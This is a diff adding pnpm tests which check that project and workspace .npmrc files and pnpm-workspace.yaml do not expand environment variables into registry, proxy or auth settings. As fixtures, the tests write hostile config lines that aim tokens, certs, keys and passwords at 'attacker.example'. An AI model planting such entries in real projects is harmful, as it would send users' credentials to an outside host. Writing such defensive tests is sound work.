@@ -238,6 +238,228 @@ test('registries in current directory\'s .npmrc have bigger priority then global
   })
 })
 
+/* eslint-disable no-template-curly-in-string */
+describe('project .npmrc env expansion trust boundary', () => {
+  const originalEnv = process.env
+
+  beforeEach(() => {
+    process.env = {
+      ...originalEnv,
+      PNPM_TEST_TOKEN: 'secret',
+    }
+  })
+
+  afterEach(() => {
+    process.env = originalEnv
+  })
+
+  test('project .npmrc does not expand env variables in registry URLs', async () => {
+    prepare()
+
+    fs.writeFileSync('.npmrc', 'registry=https://registry.example.com/${PNPM_TEST_TOKEN}/\n', 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config, warnings } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+    })
+
+    expect(config.registries.default).not.toBe('https://registry.example.com/secret/')
+    expect(JSON.stringify(config.registries)).not.toContain('secret')
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Ignored project-level request destination "registry"'),
+    ]))
+  })
+
+  test('project .npmrc does not expand env variables in scoped registry URLs or URL-scoped keys', async () => {
+    prepare()
+
+    fs.writeFileSync('.npmrc', [
+      '@scope:registry=https://registry.example.com/${PNPM_TEST_TOKEN}/',
+      '//registry.example.com/${PNPM_TEST_TOKEN}/:_authToken=token',
+      '',
+    ].join('\n'), 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config, warnings } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+    })
+
+    expect(config.registries['@scope']).toBeUndefined()
+    expect(JSON.stringify(config.rawConfig)).not.toContain('secret')
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Ignored project-level request destination "@scope:registry"'),
+      expect.stringContaining('Ignored project-level request destination "//registry.example.com/${PNPM_TEST_TOKEN}/:_authToken"'),
+    ]))
+  })
+
+  test('project .npmrc does not expand env variables in auth values', async () => {
+    prepare()
+
+    process.env.PNPM_TEST_CERT = 'secret-cert'
+    process.env.PNPM_TEST_KEY = 'secret-key'
+    process.env.PNPM_TEST_PASSWORD = Buffer.from('secret').toString('base64')
+    process.env.PNPM_TEST_USER = 'secret-user'
+
+    fs.writeFileSync('.npmrc', [
+      'registry=https://attacker.example/',
+      '//attacker.example/:_authToken=${PNPM_TEST_TOKEN}',
+      '//attacker.example/:cert=${PNPM_TEST_CERT}',
+      '//attacker.example/:key=${PNPM_TEST_KEY}',
+      '_authToken=${PNPM_TEST_TOKEN}',
+      'username=${PNPM_TEST_USER}',
+      '_password=${PNPM_TEST_PASSWORD}',
+      'cert=${PNPM_TEST_CERT}',
+      'key=${PNPM_TEST_KEY}',
+      '',
+    ].join('\n'), 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config, warnings } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+    })
+
+    const serializedRawConfig = JSON.stringify(config.rawConfig)
+    expect(serializedRawConfig).not.toContain('secret-token')
+    expect(serializedRawConfig).not.toContain('secret-user')
+    expect(serializedRawConfig).not.toContain('secret-cert')
+    expect(serializedRawConfig).not.toContain('secret-key')
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Ignored project-level auth setting "//attacker.example/:_authToken"'),
+      expect.stringContaining('Ignored project-level auth setting "//attacker.example/:cert"'),
+      expect.stringContaining('Ignored project-level auth setting "//attacker.example/:key"'),
+      expect.stringContaining('Ignored project-level auth setting "_authToken"'),
+      expect.stringContaining('Ignored project-level auth setting "username"'),
+      expect.stringContaining('Ignored project-level auth setting "_password"'),
+      expect.stringContaining('Ignored project-level auth setting "cert"'),
+      expect.stringContaining('Ignored project-level auth setting "key"'),
+    ]))
+  })
+
+  test('project .npmrc does not expand env variables in proxy URLs', async () => {
+    prepare()
+
+    fs.writeFileSync('.npmrc', [
+      'https-proxy=http://proxy.example.com/${PNPM_TEST_TOKEN}/',
+      'http-proxy=http://proxy.example.com/${PNPM_TEST_TOKEN}/',
+      'proxy=http://legacy-proxy.example.com/${PNPM_TEST_TOKEN}/',
+      '',
+    ].join('\n'), 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config, warnings } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+    })
+
+    expect(config.httpsProxy).toBeUndefined()
+    expect(config.httpProxy).toBeUndefined()
+    expect(JSON.stringify(config.rawConfig)).not.toContain('proxy.example.com/secret')
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Ignored project-level request destination "https-proxy"'),
+      expect.stringContaining('Ignored project-level request destination "http-proxy"'),
+      expect.stringContaining('Ignored project-level request destination "proxy"'),
+    ]))
+  })
+
+  test('workspace .npmrc does not expand env variables in registry URLs', async () => {
+    prepare()
+
+    fs.writeFileSync('.npmrc', '', 'utf8')
+    fs.mkdirSync('workspace-root')
+    fs.writeFileSync(path.resolve('workspace-root', '.npmrc'), 'registry=https://registry.example.com/${PNPM_TEST_TOKEN}/\n', 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config, warnings } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+      workspaceDir: path.resolve('workspace-root'),
+    })
+
+    expect(JSON.stringify(config.registries)).not.toContain('secret')
+    expect(warnings).toEqual(expect.arrayContaining([
+      expect.stringContaining('Ignored project-level request destination "registry"'),
+    ]))
+  })
+
+  test('user .npmrc may expand env variables in registry URLs', async () => {
+    prepare()
+
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), 'registry=https://registry.example.com/${PNPM_TEST_TOKEN}/\n', 'utf8')
+
+    const { config } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: {
+        name: 'pnpm',
+        version: '1.0.0',
+      },
+    })
+
+    expect(config.registries.default).toBe('https://registry.example.com/secret/')
+  })
+})
+
+test('pnpm-workspace.yaml registry setting does not expand env variables', async () => {
+  const originalEnv = process.env
+  process.env = { ...originalEnv, PNPM_TEST_TOKEN: 'secret' }
+  try {
+    prepareEmpty()
+
+    fs.writeFileSync('pnpm-workspace.yaml', 'registry: https://private.example.com/${PNPM_TEST_TOKEN}/\n', 'utf8')
+    fs.mkdirSync('user-home')
+    fs.writeFileSync(path.resolve('user-home', '.npmrc'), '', 'utf8')
+
+    const { config } = await getConfig({
+      cliOptions: {
+        userconfig: path.resolve('user-home', '.npmrc'),
+      },
+      packageManager: { name: 'pnpm', version: '1.0.0' },
+      workspaceDir: process.cwd(),
+    })
+
+    expect(config.registry).not.toBe('https://private.example.com/secret/')
+    expect(JSON.stringify(config.registries)).not.toContain('secret')
+  } finally {
+    process.env = originalEnv
+  }
+})
+/* eslint-enable no-template-curly-in-string */
+
 test('filter is read from .npmrc as an array', async () => {
   prepareEmpty()
 
